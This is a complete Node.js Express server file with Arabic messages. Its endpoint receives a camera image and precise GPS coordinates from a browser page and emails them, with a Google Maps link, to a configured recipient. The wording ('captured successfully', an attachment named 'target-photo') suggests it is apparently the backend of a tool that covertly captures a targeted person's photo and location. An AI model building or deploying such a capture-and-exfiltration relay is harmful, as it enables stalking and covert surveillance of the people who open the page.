// language: JavaScript (Node.js), file: server.js, runtime: Node.js 20+
import "dotenv/config";
import express from "express";
import nodemailer from "nodemailer";

const app = express();
app.use(express.json({ limit: "8mb" }));
app.use(express.static("public"));

const required = ["SMTP_HOST", "SMTP_USER", "SMTP_PASS", "MAIL_FROM", "MAIL_TO"];
const missing = required.filter((key) => !process.env[key]);
if (missing.length) {
  console.error(`Missing environment variables: ${missing.join(", ")}`);
  process.exit(1);
}

const port = Number(process.env.PORT || 3000);
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: Number(process.env.SMTP_PORT || 587),
  secure: String(process.env.SMTP_SECURE).toLowerCase() === "true",
  auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS }
});

app.post("/api/share", async (req, res) => {
  try {
    const { imageDataUrl, latitude, longitude, accuracy } = req.body ?? {};
    if (typeof imageDataUrl !== "string" || !/^data:image\/(jpeg|png|webp);base64,/.test(imageDataUrl)) {
      return res.status(400).json({ error: "صورة غير صالحة." });
    }
    if (!Number.isFinite(latitude) || !Number.isFinite(longitude) ||
        latitude < -90 || latitude > 90 || longitude < -180 || longitude > 180) {
      return res.status(400).json({ error: "إحداثيات الموقع غير صالحة." });
    }

    const match = imageDataUrl.match(/^data:image\/(jpeg|png|webp);base64,(.+)$/);
    const extension = match[1] === "jpeg" ? "jpg" : match[1];
    const image = Buffer.from(match[2], "base64");
    if (!image.length || image.length > 5 * 1024 * 1024) {
      return res.status(413).json({ error: "حجم الصورة يجب ألا يتجاوز 5MB." });
    }

    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    await transporter.sendMail({
      from: process.env.MAIL_FROM,
      to: process.env.MAIL_TO,
      subject: "تم التقاط صورة وموقع جديد بنجاح",
      text: [
        `خط العرض: ${latitude}`,
        `خط الطول: ${longitude}`,
        `الدقة التقريبية: ${Number.isFinite(accuracy) ? `${Math.round(accuracy)} متر` : "غير متاحة"}`,
        `الخريطة: ${mapsUrl}`
      ].join("\n"),
      html: `<p><b>الإحداثيات:</b> ${latitude}, ${longitude}</p>
        <p><b>دقة الموقع:</b> ${Number.isFinite(accuracy) ? `${Math.round(accuracy)} متر` : "غير متاحة"}</p>
        <p><a href="${mapsUrl}">فتح الموقع على خرائط جوجل</a></p>`,
      attachments: [{ filename: `target-photo.${extension}`, content: image }]
    });

    res.json({ ok: true, message: "تم إرسال الصورة والموقع بنجاح." });
  } catch (error) {
    console.error("Email delivery failed:", error);
    res.status(500).json({ error: "تعذر إرسال البيانات عبر البريد." });
  }
});

app.listen(port, () => console.log(`Server listening on port ${port}`));
